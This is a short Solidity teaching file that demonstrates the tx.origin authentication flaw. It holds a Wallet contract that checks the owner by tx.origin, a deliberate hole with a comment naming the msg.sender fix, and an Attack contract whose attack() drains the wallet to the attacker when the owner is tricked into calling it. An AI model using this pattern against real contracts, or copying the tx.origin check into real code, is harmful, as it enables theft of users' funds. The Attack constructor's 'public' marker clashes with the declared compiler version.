// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// tx.origin is the account address from the transaction started
// eg A -> B -> C then tx.origin will be A's address

// we can exploit the contracts which use tx.origin instead of msg.sender to send ether

contract Wallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function addAmount() public payable {}

    function transfer(address payable receiver) public payable {
        // here this tx.origin causes the issue as if any hacker manipulate the owner to execute the
        // attack function of the his contract then tx.origin will be the owner instead of that hacker

        // PREVENTION : -
        // use msg.sender or check the last person who executed the code
        require(tx.origin == owner, "only owner can execute this function!!");

        (bool send, ) = receiver.call{value: address(this).balance}("");

        require(send, "failed to send the ether!!");
    }
}

contract Attack {
    address payable public receiver;
    Wallet wallet;

    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
        receiver = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(receiver);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
